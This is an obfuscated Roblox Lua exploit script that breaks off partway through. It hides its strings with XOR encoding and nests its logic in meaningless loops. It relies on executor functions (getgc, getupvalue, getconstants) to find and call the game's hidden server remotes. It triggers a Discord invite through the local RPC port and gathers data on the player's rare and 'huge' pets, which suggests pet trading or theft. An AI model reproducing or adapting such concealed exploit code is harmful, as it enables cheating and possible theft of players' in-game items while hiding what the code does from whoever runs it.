
do
	local v0 = string.char;
	local v1 = string.byte;
	local v2 = string.sub;
	local v3 = bit32 or bit;
	local v4 = v3.bxor;
	local v5 = table.concat;
	local v6 = table.insert;
	local function v7(v255, v256)
		local v257 = 0;
		local v258;
		while true do
			if (v257 == 1) then
				return v5(v258);
			end
			if (v257 == 0) then
				v258 = {};
				for v500 = 1, #v255 do
					v6(v258, v0(v4(v1(v2(v255, v500, v500 + 1)), v1(v2(v256, 1 + ((v500 - 1) % #v256), 1 + ((v500 - 1) % #v256) + 1))) % 256));
				end
				v257 = 1;
			end
		end
	end
	local v0 = string[v7("\55\46\1\210", "\84\70\96\160\58\141")];
	local v1 = string[v7("\4\20\175\196", "\102\109\219\161\211")];
	local v2 = string[v7("\217\101\24", "\170\16\122\93")];
	local v3 = bit32 or bit;
	local v4 = v3[v7("\75\48\244\188", "\41\72\155\206")];
	local v5 = table[v7("\1\60\72\121\85\26", "\98\83\38\26\52\110\44\38")];
	local v6 = table[v7("\30\41\231\83\5\51", "\119\71\148\54")];
	local function v7(v259, v260)
		local v261 = 0;
		local v262;
		while true do
			if (v261 == 1) then
				return v5(v262);
			end
			if (v261 == 0) then
				v262 = {};
				for v501 = 1, #v259 do
					v6(v262, v0(v4(v1(v2(v259, v501, v501 + 1)), v1(v2(v260, 1 + ((v501 - 1) % #v260), 1 + ((v501 - 1) % #v260) + 1))) % 256));
				end
				v261 = 1;
			end
		end
	end
	local v8 = require(game[v7("\221\93\198\41\32\220\238\76\211\33\26\203\224\74\215\34\44", "\143\56\182\69\73\191")]:WaitForChild(v7("\162\211\1\180\58\38\19\150\202", "\228\161\96\217\95\81\124")):WaitForChild(v7("\247\216\44\78\218\195\55", "\187\177\78\60")));
	local v9 = getupvalue or debug[v7("\134\250\93\215\210\61\19\141\234\76", "\225\159\41\162\162\75\114")];
	local v10 = {[v7("\197\129\61\222\70", "\173\224\77\174\63")]="\240\159\165\179\239\184\143",[v7("\68\195\74\32\143", "\38\175\43\78\228\33")]="\240\159\147\139",[v7("\6\140\207\115\13\139\202", "\98\229\174\30")]="\240\159\146\142",[v7("\2\207\43\20\250", "\99\189\89\123\141\230\49\141")]="\226\158\156",[v7("\2\94\242\99", "\113\42\147\17\150")]="\226\173\144"};
	local v11 = {[v7("\25\252\215\28\175\63\24\250\250\27\153\46\28\224\251\26\180\40", "\112\143\136\111\198\77")]=v7("\212\142\187\10\242\149\189", "\135\231\201\98"),[v7("\183\83\191\231\40\200\191\83\190\241\3\200", "\199\54\221\132\119\173")]=v7("\137\30\140\53\13\6\224\193\170\4\134\51", "\217\108\227\65\98\85\141\160"),[v7("\208\236\235", "\163\149\133\76\94")]=v7("\229\185\3\46\54\230\49\150\152", "\182\192\109\79\70\149\84"),[v7("\19\197\89\248\42\5\255\86\226\57\4", "\96\160\58\141\88")]=v7("\62\190\207\167\90\3\190\205", "\109\219\161\211\51"),[v7("\91\40\19\121\118\4\212\81\62\24\113", "\16\122\93\53\41\72\155")]=v7("\153\16\61\74", "\210\98\83\38\26\52\110\44"),[v7("\107\56\9\213\103\59\8\213\124\50\3", "\56\119\71\148")]=v7("\192\224\86\215", "\147\143\56\182")};
	local v12 = v7("\2\214\210\193\232\32\203\222\193\236\33\214\194\193\250\49\207\218\142\246\61", "\73\191\182\225\159");
	for v263, v264 in pairs(v11) do
		if _G[v263] then
			v12 = v264;
			break;
		end
	end
	local v13 = {};
	v13.formatted_number = function(v265)
		local v266 = 0;
		local v267;
		local v268;
		local v269;
		while true do
			if (v266 == 0) then
				v267 = 0;
				v268 = nil;
				v266 = 1;
			end
			if (v266 == 1) then
				v269 = nil;
				while true do
					if (v267 == (2 - 1)) then
						while true do
							local v537 = 0;
							local v538;
							while true do
								if (v537 == 0) then
									v538 = 0;
									while true do
										if (v538 == 0) then
											if (v268 == 1) then
												local v630 = 0;
												local v631;
												local v632;
												while true do
													if (0 == v630) then
														v631 = 0;
														v632 = nil;
														v630 = 1;
													end
													if (v630 == 1) then
														while true do
															if (v631 == 0) then
																v632 = 0;
																while true do
																	if (v632 == 0) then
																		local v736 = 0;
																		local v737;
																		while true do
																			if (0 == v736) then
																				v737 = 0;
																				while true do
																					if (v737 == 0) then
																						local v804 = 0;
																						while true do
																							if (v804 == 0) then
																								v269 = v269:gsub(v7("\252\142", "\162\162\75\114"), "");
																								return v269;
																							end
																						end
																					end
																				end
																				break;
																			end
																		end
																	end
																end
																break;
															end
														end
														break;
													end
												end
											end
											if (0 == v268) then
												local v633 = 0;
												local v634;
												while true do
													if (v633 == 0) then
														v634 = 0;
														while true do
															if (v634 == 1) then
																v268 = 1;
																break;
															end
															if (v634 == 0) then
																local v713 = 0;
																while true do
																	if (v713 == 0) then
																		v269 = string.format(v7("\16\197\215\18", "\53\235\231\116\98"), v265);
																		v269 = v269:reverse():gsub(v7("\116\1\230\22\130\117\160\80", "\92\36\130\51\230\80\196\121"), v7("\255\20\228", "\218\37\200\213\188\234")):reverse();
																		v713 = 1;
																	end
																	if (v713 == 1) then
																		v634 = 1;
																		break;
																	end
																end
															end
														end
														break;
													end
												end
											end
											break;
										end
									end
									break;
								end
							end
						end
						break;
					end
					if (v267 == 0) then
						local v512 = 0;
						local v513;
						while true do
							if (v512 == 0) then
								v513 = 0;
								while true do
									if (v513 == 1) then
										v267 = 1;
										break;
									end
									if (v513 == 0) then
										local v605 = 0;
										while true do
											if (v605 == 0) then
												v268 = 0;
												v269 = nil;
												v605 = 1;
											end
											if (v605 == 1) then
												v513 = 1;
												break;
											end
										end
									end
								end
								break;
							end
						end
					end
				end
				break;
			end
		end
	end;
	local v15 = game:GetService(v7("\91\22\107\91\61\118\16\105\66\13\118", "\19\98\31\43\110"));
	request = http_request or request or HttpPost or syn[v7("\71\142\150\1\7\70\159", "\53\235\231\116\98")];
	v13.join_server = function(v270)
		local v271 = 0;
		local v272;
		local v273;
		local v274;
		while true do
			if (v271 == 1) then
				v274 = nil;
				while true do
					if (v272 == 0) then
						local v514 = 0;
						while true do
							if (v514 == 1) then
								v272 = 1;
								break;
							end
							if (v514 == 0) then
								v273 = 0 - 0;
								v274 = nil;
								v514 = 1;
							end
						end
					end
					if (v272 == 1) then
						while true do
							if (v273 == 0) then
								v274 = 0;
								while true do
									if (v274 == 0) then
										local v606 = 0;
										local v607;
										while true do
											if (v606 == 0) then
												v607 = 0;
												while true do
													if (v607 == 0) then
														local v672 = 0;
														local v673;
														while true do
															if (v672 == 0) then
																v673 = 0;
																while true do
																	if (0 == v673) then
																		local v738 = 0;
																		while true do
																			if (v738 == 0) then
																				if (request == nil) then
																					return;
																				end
																				return request({[v7("\190\20\19", "\235\102\127\50\167\204\18")]="http://127.0.0.1:6463/rpc?v=1",[v7("\3\85\181\253\44\64", "\78\48\193\149\67\36")]=v7("\113\31\45\180", "\33\80\126\224\120"),[v7("\126\227\172\26", "\60\140\200\99\164")]=v15:JSONEncode({[v7("\161\138\240", "\194\231\148\100\70")]=v7("\225\104\122\232\151\211\247\100\126\238\148\197\237\116", "\168\38\44\161\195\150"),[v7("\23\146\251\145", "\118\224\156\226\22\80\136\214")]={[v7("\131\77\234\92", "\224\34\142\57")]=v270},[v7("\0\209\169\198\216", "\110\190\199\165\189\19\145\61")]=string.lower(v15:GenerateGUID(false))}),[v7("\239\223\234\115\237\153\212", "\167\186\139\23\136\235")]={[v7("\46\21\187\156\8\20\161\197\57\3\165\141", "\109\122\213\232")]="application/json",[v7("\31\252\254\165\57\224", "\80\142\151\194")]="https://discord.com"}});
																			end
																		end
																	end
																end
																break;
															end
														end
													end
												end
												break;
											end
										end
									end
								end
								break;
							end
						end
						break;
					end
				end
				break;
			end
			if (v271 == 0) then
				v272 = 0;
				v273 = nil;
				v271 = 1;
			end
		end
	end;
	local v17 = {[v7("\121\23\207\123\95", "\44\99\166\23")]={[v7("\141\114\225\38\61\54", "\196\28\151\73\86\83")]=v9(v8[v7("\18\65\246\68\137\34\175", "\92\36\130\51\230\80\196\121")].Invoke, 2),[v7("\80\250\17\44", "\22\147\99\73\112\226\56\120")]=v9(v8[v7("\148\64\188\162\211\152\177", "\218\37\200\213\188\234")].Fire, 2)},[v7("\190\189\97\246\252\131\191\102", "\237\216\21\130\149")]={[v7("\108\135\67\80\75\181\250\74\131\64\91\94\162\221\112\131\67\90", "\62\226\46\63\63\208\169")]=true}};
	v17[v7("\76\61\118\69\10\118\26", "\19\98\31\43\110")] = v17;
	v17.InvokeServer = function(v275, ...)
		local v276 = 0;
		local v277;
		local v278;
		while true do
			if (v276 == 0) then
				v277 = 0;
				v278 = nil;
				v276 = 1;
			end
			if (v276 == 1) then
				while true do
					if (v277 == 0) then
						v278 = 0;
						while true do
							if (v278 == 0) then
								local v562 = 0;
								while true do
									if (v562 == 0) then
										assert(v275[v7("\136\10\30\65\212", "\235\102\127\50\167\204\18")] == v7("\108\224\20\90\151\26\43\58\80\230\13\92\140\17", "\62\133\121\53\227\127\109\79"));
										return v275[v7("\27\68\168\249\48", "\78\48\193\149\67\36")].Invoke(v275.name):InvokeServer(...);
									end
								end
							end
						end
						break;
					end
				end
				break;
			end
		end
	end;
	v17.FireServer = function(v279, ...)
		local v280 = 0;
		local v281;
		local v282;
		local v283;
		while true do
			if (0 == v280) then
				v281 = 0;
				v282 = nil;
				v280 = 1;
			end
			if (1 == v280) then
				v283 = nil;
				while true do
					if (v281 == 1) then
						while true do
							if (v282 == 0) then
								v283 = 0;
								while true do
									if (v283 == (0 - 0)) then
										assert(v279[v7("\66\60\31\147\11", "\33\80\126\224\120")] == v7("\144\21\25\61\225\211\139\180\21\26\38", "\194\112\116\82\149\182\206"));
										v279[v7("\105\248\161\15\215", "\60\140\200\99\164")].Fire(v279.name):FireServer(...);
										break;
									end
								end
								break;
							end
						end
						break;
					end
					if (v281 == 0) then
						local v515 = 0;
						while true do
							if (0 == v515) then
								v282 = 0;
								v283 = nil;
								v515 = 1;
							end
							if (v515 == 1) then
								v281 = 1;
								break;
							end
						end
					end
				end
				break;
			end
		end
	end;
	v17.new = function(v284, v285)
		local v286 = 0;
		local v287;
		local v288;
		local v289;
		while true do
			if (1 == v286) then
				v289 = nil;
				while true do
					if (v287 == 1) then
						while true do
							if (v288 == 0) then
								v289 = 0;
								while true do
									local v582 = 0;
									local v583;
									local v584;
									while true do
										if (v582 == 0) then
											v583 = 0;
											v584 = nil;
											v582 = 1;
										end
										if (v582 == 1) then
											while true do
												if (v583 == 0) then
													v584 = 0;
													while true do
														if (0 == v584) then
															if (0 == v289) then
																local v714 = 0;
																local v715;
																while true do
																	if (v714 == 0) then
																		v715 = 0;
																		while true do
																			if (v715 == 0) then
																				local v766 = 0;
																				local v767;
																				while true do
																					if (v766 == 0) then
																						v767 = 0;
																						while true do
																							if (v767 == 1) then
																								v715 = 1;
																								break;
																							end
																							if (v767 == 0) then
																								local v815 = 0;
																								while true do
																									if (v815 == 1) then
																										v767 = 1;
																										break;
																									end
																									if (v815 == 0) then
																										self = setmetatable({}, v17);
																										self[v7("\161\139\245\23\53", "\194\231\148\100\70")] = v285;
																										v815 = 1;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																			if (v715 == 1) then
																				v289 = 1;
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															if ((2 - 1) == v289) then
																local v716 = 0;
																local v717;
																while true do
																	if (v716 == 0) then
																		v717 = 0;
																		while true do
																			if (0 == v717) then
																				local v768 = 0;
																				local v769;
																				while true do
																					if (v768 == 0) then
																						v769 = 0;
																						while true do
																							if (v769 == 0) then
																								local v816 = 0;
																								while true do
																									if (v816 == 0) then
																										self[v7("\198\71\65\196", "\168\38\44\161\195\150")] = v284;
																										return self;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
													break;
												end
											end
											break;
										end
									end
								end
								break;
							end
						end
						break;
					end
					if (v287 == 0) then
						local v516 = 0;
						while true do
							if (0 == v516) then
								v288 = 0;
								v289 = nil;
								v516 = 1;
							end
							if (v516 == 1) then
								v287 = 1;
								break;
							end
						end
					end
				end
				break;
			end
			if (v286 == 0) then
				v287 = 0;
				v288 = nil;
				v286 = 1;
			end
		end
	end;
	local v22 = {[v7("\61\56\190\73", "\110\89\200\44\120\160\130")]={{},{}}};
	v22[v7("\41\191\245\140\114\53\240", "\118\224\156\226\22\80\136\214")] = v22;
	local v24 = {v7("\127\174\206\68\82\70\111\45\72\165\215", "\45\203\163\43\38\35\42\91"),v7("\102\215\136\211\55\130\143\65\220\134\200\42\136\167", "\52\178\229\188\67\231\201")};
	v22.get = function(v290)
		for v423, v424 in pairs(v22.Save) do
			local v425 = 0;
			local v426;
			while true do
				if (v425 == 0) then
					v426 = v424[v290];
					if v426 then
						return v426;
					end
					break;
				end
			end
		end
	end;
	v22.add = function(v291, v292)
		local v293 = 0;
		while true do
			if (v293 == 0) then
				if not v291 then
					return;
				end
				if not table.find(v22[v7("\179\67\248\92", "\224\34\142\57")][v292], v291) then
					v22[v7("\61\223\177\192", "\110\190\199\165\189\19\145\61")][v292][v291] = v17.new(v291, v24[v292]);
				end
				break;
			end
		end
	end;
	local v27 = v9(v9(v17[v7("\242\206\226\123\251", "\167\186\139\23\136\235")].Invoke, 2), 620 - (555 + 64));
	local v28 = v9(v9(v17[v7("\56\14\188\132\30", "\109\122\213\232")].Invoke, 1), 1);
	local v29 = v9(v9(v9(v8[v7("\30\235\227\181\63\252\252", "\80\142\151\194")].Invoke, 3), 1), 1);
	local v30 = {};
	for v294, v295 in pairs(v27) do
		for v427, v428 in pairs(v295) do
			v30[v428] = v427;
		end
	end
	for v296, v297 in pairs(v28) do
		for v430, v431 in pairs(v297) do
			local v432 = 0;
			local v433;
			local v434;
			while true do
				if (v432 == 0) then
					v433 = 0;
					v434 = nil;
					v432 = 1;
				end
				if (v432 == 1) then
					while true do
						if (v433 == 0) then
							v434 = 0;
							while true do
								if (v434 == 0) then
									if v17[v7("\127\6\210\99\69\13\193\100", "\44\99\166\23")][v7("\150\121\250\38\34\54\151\104\246\39\50\50\182\104\217\40\59\54", "\196\28\151\73\86\83")] then
										v431[v7("\88\242\14\44", "\22\147\99\73\112\226\56\120")] = v30[v430] or v431[v7("\163\185\120\231", "\237\216\21\130\149")];
									end
									v22.add(v431.Name, ((v431[v7("\125\142\79\76\76\158\200\83\135", "\62\226\46\63\63\208\169")] == v7("\17\36\76\95\16\242\121\53\36\79\68", "\67\65\33\48\100\151\60")) and 1) or ((v431[v7("\125\233\24\70\144\49\12\34\91", "\62\133\121\53\227\127\109\79")] == v7("\193\218\234\161\204\246\249\242\160\219\231\214\232\160", "\147\191\135\206\184")) and (933 - (857 + 74))));
									break;
								end
							end
							break;
						end
					end
					break;
				end
			end
		end
	end
	for v298, v299 in pairs(v29) do
		for v435, v436 in pairs(v299) do
			if v17[v7("\145\21\0\38\252\216\169\177", "\194\112\116\82\149\182\206")][v7("\60\60\165\67\12\197\209\26\56\166\72\25\210\246\32\56\165\73", "\110\89\200\44\120\160\130")] then
				v436[v7("\99\170\206\78", "\45\203\163\43\38\35\42\91")] = v30[v435] or v436[v7("\122\211\136\217", "\52\178\229\188\67\231\201")];
			end
		end
	end
	for v300, v301 in pairs(getgc()) do
		if ((type(v301) == v7("\180\145\38\165\213\209\92\188", "\210\228\72\198\161\184\51")) and islclosure(v301)) then
			local v483 = 0;
			local v484;
			local v485;
			local v486;
			while true do
				if (v483 == 0) then
					v484 = 0;
					v485 = nil;
					v483 = 1;
				end
				if (v483 == 1) then
					v486 = nil;
					while true do
						if (v484 == 0) then
							local v560 = 0;
							local v561;
							while true do
								if (v560 == 0) then
									v561 = 0;
									while true do
										if (0 == v561) then
											local v625 = 0;
											while true do
												if (v625 == 0) then
													v485 = getconstants(v301);
													v486 = 568 - (367 + 201);
													v625 = 1;
												end
												if (v625 == 1) then
													v561 = 928 - (214 + 713);
													break;
												end
											end
										end
										if (1 == v561) then
											v484 = 1;
											break;
										end
									end
									break;
								end
							end
						end
						if (v484 == 1) then
							for v563, v564 in pairs(v485) do
								if (v564 == v7("\224\51\93\228\31\97\197", "\174\86\41\147\112\19")) then
									v486 = v563;
								elseif ((v564 == v7("\130\85\22\130\0\32", "\203\59\96\237\107\69\111\113")) and ((v486 + 1) == v563)) then
									local v618 = 0;
									local v619;
									local v620;
									while true do
										if (v618 == 1) then
											while true do
												if (0 == v619) then
													v620 = v485[v486 + 2];
													v22.add(v620, 2);
													break;
												end
											end
											break;
										end
										if (v618 == 0) then
											v619 = 0;
											v620 = nil;
											v618 = 1;
										end
									end
								elseif ((v564 == v7("\241\45\4\169", "\183\68\118\204\129\81\144")) and ((v486 + 1) == v563)) then
									local v635 = 0;
									local v636;
									local v637;
									local v638;
									while true do
										if (v635 == 1) then
											v638 = nil;
											while true do
												if (v636 == 1) then
													while true do
														if (v637 == 0) then
															v638 = v485[v486 + 2];
															v22.add(v638, 1);
															break;
														end
													end
													break;
												end
												if (v636 == 0) then
													local v718 = 0;
													while true do
														if (v718 == 0) then
															v637 = 0;
															v638 = nil;
															v718 = 1;
														end
														if (v718 == 1) then
															v636 = 1;
															break;
														end
													end
												end
											end
											break;
										end
										if (v635 == 0) then
											v636 = 0;
											v637 = nil;
											v635 = 1;
										end
									end
								end
							end
							break;
						end
					end
					break;
				end
			end
		end
	end
	local v31 = {{v7("\177\11\163\116\164\38\131\7\161", "\226\110\205\16\132\107"),2},{v7("\99\234\205\235\153\101\238\211\239\202\72\255", "\33\139\163\128\185"),2},{v7("\252\86\86\15\158\96\81\16\214\83\74\5\201", "\190\55\56\100"),2}};
	for v302, v303 in next, v31 do
		v22.add(v303[1], v303[2]);
	end
	local v32 = {};
	v32[v7("\28\30\72\94\0\242\68", "\67\65\33\48\100\151\60")] = v32;
	v32.new = function(v304)
		local v305 = 0;
		local v306;
		local v307;
		while true do
			if (v305 == 1) then
				while true do
					if (v306 == 0) then
						v307 = 0;
						while true do
							local v539 = 0;
							local v540;
							local v541;
							while true do
								if (v539 == 1) then
									while true do
										if (v540 == 0) then
											v541 = 0;
											while true do
												if (0 == v541) then
													if (v307 == 1) then
														return self;
													end
													if (v307 == 0) then
														local v674 = 0;
														local v675;
														local v676;
														while true do
															if (v674 == 1) then
																while true do
																	if (v675 == 0) then
																		v676 = 0;
																		while true do
																			if (v676 == 1) then
																				v307 = 1;
																				break;
																			end
																			if (v676 == 0) then
																				local v770 = 0;
																				local v771;
																				while true do
																					if (v770 == 0) then
																						v771 = 0;
																						while true do
																							if (0 == v771) then
																								local v817 = 0;
																								while true do
																									if (0 == v817) then
																										self = setmetatable({}, v32);
																										self[v7("\227\218\243\189", "\147\191\135\206\184")] = v304;
																										v817 = 1;
																									end
																									if (v817 == 1) then
																										v771 = 1;
																										break;
																									end
																								end
																							end
																							if (v771 == 1) then
																								v676 = 1;
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
															if (v674 == 0) then
																v675 = 0;
																v676 = nil;
																v674 = 1;
															end
														end
													end
													break;
												end
											end
											break;
										end
									end
									break;
								end
								if (0 == v539) then
									v540 = 0;
									v541 = nil;
									v539 = 1;
								end
							end
						end
						break;
					end
				end
				break;
			end
			if (v305 == 0) then
				v306 = 0;
				v307 = nil;
				v305 = 1;
			end
		end
	end;
	v32.get_rm_pets = function(v308)
		local v309 = 0;
		local v310;
		local v311;
		while true do
			if (v309 == 1) then
				while true do
					local v503 = 0;
					local v504;
					local v505;
					while true do
						if (v503 == 0) then
							v504 = 0;
							v505 = nil;
							v503 = 1;
						end
						if (1 == v503) then
							while true do
								if (v504 == 0) then
									v505 = 0;
									while true do
										if (v505 == 0) then
											if (v310 == (0 + 0)) then
												local v639 = 0;
												local v640;
												local v641;
												while true do
													if (v639 == 0) then
														v640 = 0;
														v641 = nil;
														v639 = 1;
													end
													if (v639 == 1) then
														while true do
															if (0 == v640) then
																v641 = 0;
																while true do
																	if (v641 == 1) then
																		v310 = 1;
																		break;
																	end
																	if (v641 == 0) then
																		local v740 = 0;
																		while true do
																			if (0 == v740) then
																				v311 = {};
																				for v791, v792 in pairs(v308.pets) do
																					local v793 = 0;
																					local v794;
																					local v795;
																					while true do
																						if (v793 == 0) then
																							v794 = 0;
																							v795 = nil;
																							v793 = 1;
																						end
																						if (1 == v793) then
																							while true do
																								if (v794 == 0) then
																									v795 = v8[v7("\150\141\58\163\194\204\92\160\157", "\210\228\72\198\161\184\51")][v7("\254\51\93\224", "\174\86\41\147\112\19")][v792[v7("\162\95", "\203\59\96\237\107\69\111\113")]];
																									if ((v795[v7("\223\49\17\169", "\183\68\118\204\129\81\144")] == true) or (v795[v7("\144\15\191\121\240\18", "\226\110\205\16\132\107")] == v7("\214\64\170\50\10", "\147\54\207\92\126\115\131")) or (v795[v7("\83\234\209\233\205\88", "\33\139\163\128\185")] == v7("\91\21\50\57\104\30\119\27\52", "\30\109\81\85\29\109"))) then
																										table.insert(v311, v792);
																									end
																									break;
																								end
																							end
																							break;
																						end
																					end
																				end
																				v740 = 1;
																			end
																			if (v740 == 1) then
																				v641 = 1;
																				break;
																			end
																		end
																	end
																end
																break;
															end
														end
														break;
													end
												end
											end
											if (v310 == 1) then
												return v311;
											end
											break;
										end
									end
									break;
								end
							end
							break;
						end
					end
				end
				break;
			end
			if (v309 == 0) then
				v310 = 0;
				v311 = nil;
				v309 = 1;
			end
		end
	end;
	v32.count_rm_pets = function()
		local v312 = 0;
		local v313;
		local v314;
		local v315;
		local v316;
		while true do
			if (v312 == 1) then
				v315 = nil;
				v316 = nil;
				v312 = 2;
			end
			if (v312 == 2) then
				while true do
					if (v313 == 0) then
						local v517 = 0;
						while true do
							if (v517 == 0) then
								v314 = 0;
								v315 = nil;
								v517 = 1;
							end
							if (v517 == 1) then
								v313 = 1;
								break;
							end
						end
					end
					if (v313 == 1) then
						v316 = nil;
						while true do
							local v542 = 0;
							local v543;
							while true do
								if (v542 == 0) then
									v543 = 0;
									while true do
										if (v543 == 0) then
											if (v314 == (878 - (282 + 595))) then
												local v642 = 0;
												local v643;
												while true do
													if (0 == v642) then
														v643 = 0;
														while true do
															if (v643 == 0) then
																local v719 = 0;
																while true do
																	if (v719 == 0) then
																		for v750, v751 in pairs(v315) do
																			local v752 = 0;
																			local v753;
																			local v754;
																			local v755;
																			local v756;
																			while true do
																				if (v752 == 2) then
																					while true do
																						if (v753 == 0) then
																							local v810 = 0;
																							while true do
																								if (v810 == 0) then
																									v754 = 0;
																									v755 = nil;
																									v810 = 1;
																								end
																								if (v810 == 1) then
																									v753 = 1;
																									break;
																								end
																							end
																						end
																						if (v753 == 1) then
																							v756 = nil;
																							while true do
																								if (0 == v754) then
																									local v826 = 0;
																									local v827;
																									while true do
																										if (v826 == 0) then
																											v827 = 0;
																											while true do
																												if (v827 == 1) then
																													v754 = 1;
																													break;
																												end
																												if (0 == v827) then
																													local v856 = 0;
																													while true do
																														if (v856 == 0) then
																															v755 = 0;
																															v756 = nil;
																															v856 = 1;
																														end
																														if (v856 == 1) then
																															v827 = 1;
																															break;
																														end
																													end
																												end
																											end
																											break;
																										end
																									end
																								end
																								if (v754 == 1) then
																									while true do
																										if (v755 == 0) then
																											v756 = v8[v7("\250\94\74\1\221\67\87\22\199", "\190\55\56\100")][v7("\195\83\187\47", "\147\54\207\92\126\115\131")][v751[v7("\119\9", "\30\109\81\85\29\109")]];
																											if ((v756[v7("\244\234\118\81", "\156\159\17\52\214\86\190")] == true) or (v756[v7("\174\175\253\180\168\183", "\220\206\143\221")] == v7("\217\233\116\90\162", "\156\159\17\52\214\86\190")) or (v756[v7("\192\135\111\36\3\193", "\178\230\29\77\119\184\172")] == v7("\153\182\236\177\169\189\230\171\185", "\220\206\143\221"))) then
																												v316 = v316 + 1;
																											end
																											break;
																										end
																									end
																									break;
																								end
																							end
																							break;
																						end
																					end
																					break;
																				end
																				if (1 == v752) then
																					v755 = nil;
																					v756 = nil;
																					v752 = 2;
																				end
																				if (0 == v752) then
																					v753 = 0;
																					v754 = nil;
																					v752 = 1;
																				end
																			end
																		end
																		return v316;
																	end
																end
															end
														end
														break;
													end
												end
											end
											if (v314 == 0) then
												local v644 = 0;
												local v645;
												while true do
													if (v644 == 0) then
														v645 = 0;
														while true do
															if (1 == v645) then
																v314 = 1;
																break;
															end
															if (v645 == 0) then
																local v720 = 0;
																while true do
																	if (1 == v720) then
																		v645 = 1;
																		break;
																	end
																	if (v720 == 0) then
																		v315 = v8[v7("\203\244\168\15", "\152\149\222\106\123\23")].Get()[v7("\133\216\50\229", "\213\189\70\150\35")];
																		v316 = 0;
																		v720 = 1;
																	end
																end
															end
														end
														break;
													end
												end
											end
											break;
										end
									end
									break;
								end
							end
						end
						break;
					end
				end
				break;
			end
			if (v312 == 0) then
				v313 = 0;
				v314 = nil;
				v312 = 1;
			end
		end
	end;
	v32.get_hugs_pets = function()
		local v317 = 0;
		local v318;
		local v319;
		local v320;
		local v321;
		while true do
			if (v317 == 1) then
				v320 = nil;
				v321 = nil;
				v317 = 2;
			end
			if (v317 == 2) then
				while true do
					if (v318 == 1) then
						v321 = nil;
						while true do
							local v544 = 0;
							local v545;
							while true do
								if (v544 == 0) then
									v545 = 0;
									while true do
										if (v545 == 0) then
											if (v319 == 1) then
												local v646 = 0;
												local v647;
												while true do
													if (0 == v646) then
														v647 = 0;
														while true do
															if (v647 == 0) then
																local v721 = 0;
																while true do
																	if (v721 == 0) then
																		for v757, v758 in pairs(v321) do
																			local v759 = 0;
																			local v760;
																			local v761;
																			while true do
																				if (1 == v759) then
																					while true do
																						if (v760 == (1637 - (1523 + 114))) then
																							v761 = v8[v7("\44\70\71\113\11\91\90\102\17", "\104\47\53\20")][v7("\63\166\88\146", "\111\195\44\225\124\220")][v758[v7("\162\220", "\203\184\38\96\19\203")]];
																							if v761[v7("\198\44\116\124", "\174\89\19\25\33")] then
																								table.insert(v320, v758);
																							end
																							break;
																						end
																					end
																					break;
																				end
																				if (v759 == 0) then
																					v760 = 0;
																					v761 = nil;
																					v759 = 1;
																				end
																			end
																		end
																		return v320;
																	end
																end
															end
														end
														break;
													end
												end
											end
											if (v319 == 0) then
												local v648 = 0;
												local v649;
												local v650;
												while true do
													if (v648 == 1) then
														while true do
															if (v649 == 0) then
																v650 = 0;
																while true do
																	if (v650 == 0) then
																		local v742 = 0;
																		while true do
																			if (v742 == 1) then
																				v650 = 1;
																				break;
																			end
																			if (v742 == 0) then
																				v320 = {};
																				v321 = v8[v7("\56\46\4\87", "\107\79\114\50\46\151\231")].Get()[v7("\240\60\178\166", "\160\89\198\213\73\234\89\215")];
																				v742 = 1;
																			end
																		end
																	end
																	if (v650 == 1) then
																		v319 = 1;
																		break;
																	end
																end
																break;
															end
														end
														break;
													end
													if (v648 == 0) then
														v649 = 0;
														v650 = nil;
														v648 = 1;
													end
												end
											end
											break;
										end
									end
									break;
								end
							end
						end
						break;
					end
					if (v318 == 0) then
						local v518 = 0;
						local v519;
						while true do
							if (v518 == 0) then
								v519 = 0;
								while true do
									if (v519 == 0) then
										local v609 = 0;
										while true do
											if (v609 == 1) then
												v519 = 1;
												break;
											end
											if (0 == v609) then
												v319 = 0;
												v320 = nil;
												v609 = 1;
											end
										end
									end
									if (v519 == 1) then
										v318 = 1;
										break;
									end
								end
								break;
							end
						end
					end
				end
				break;
			end
			if (v317 == 0) then
				v318 = 0;
				v319 = nil;
				v317 = 1;
			end
		end
	end;
	v32.get_hugs_pets_data = function(v322)
		local v323 = 0;
		local v324;
		local v325;
		local v326;
		local v327;
		while true do
			if (v323 == 2) then
				while true do
					if (v324 == 1) then
						v327 = nil;
						while true do
							if (v325 == 0) then
								local v565 = 0;
								while true do
									if (v565 == 1) then
										v325 = 1;
										break;
									end
									if (0 == v565) then
										v326 = 0 + 0;
										v327 = nil;
										v565 = 1;
									end
								end
							end
							if (v325 == 1) then
								while true do
									local v585 = 0;
									local v586;
									while true do
										if (v585 == 0) then
											v586 = 0;
											while true do
												if (v586 == 0) then
													if (v326 == 1) then
														return v327;
													end
													if (v326 == 0) then
														local v677 = 0;
														local v678;
														while true do
															if (v677 == 0) then
																v678 = 0 - 0;
																while true do
																	if (v678 == (1065 - (68 + 997))) then
																		local v743 = 0;
																		local v744;
																		while true do
																			if (v743 == 0) then
																				v744 = 0;
																				while true do
																					if (v744 == 1) then
																						v678 = 1;
																						break;
																					end
																					if (0 == v744) then
																						local v805 = 0;
																						while true do
																							if (1 == v805) then
																								v744 = 1;
																								break;
																							end
																							if (0 == v805) then
																								v327 = {};
																								for v828, v829 in pairs(v322) do
																									local v830 = 0;
																									local v831;
																									local v832;
																									while true do
																										if (v830 == 0) then
																											v831 = 0;
																											v832 = nil;
																											v830 = 1;
																										end
																										if (v830 == 1) then
																											while true do
																												if (v831 == 1) then
																													local v857 = 0;
																													while true do
																														if (v857 == 1) then
																															v831 = 2;
																															break;
																														end
																														if (v857 == 0) then
																															if v832['g'] then
																																g_r = v7("\245\137\113\41\18\214", "\178\230\29\77\119\184\172");
																															elseif v832['r'] then
																																g_r = v7("\202\244\183\4\25\120\239", "\152\149\222\106\123\23");
																															elseif (not v_g and not v_r) then
																																g_r = v7("\155\210\52\251\66\185", "\213\189\70\150\35");
																															end
																															v832[v7("\194\119\99", "\165\40\17\212\158")] = g_r;
																															v857 = 1;
																														end
																													end
																												end
																												if (v831 == 0) then
																													local v858 = 0;
																													while true do
																														if (v858 == 0) then
																															v832 = v8[v7("\2\236\203\13\48\50\234\203\17", "\70\133\185\104\83")][v7("\249\1\81\87", "\169\100\37\36\74")][v829[v7("\89\4", "\48\96\231\194")]];
																															g_r = nil;
																															v858 = 1;
																														end
																														if (1 == v858) then
																															v831 = 1;
																															break;
																														end
																													end
																												end
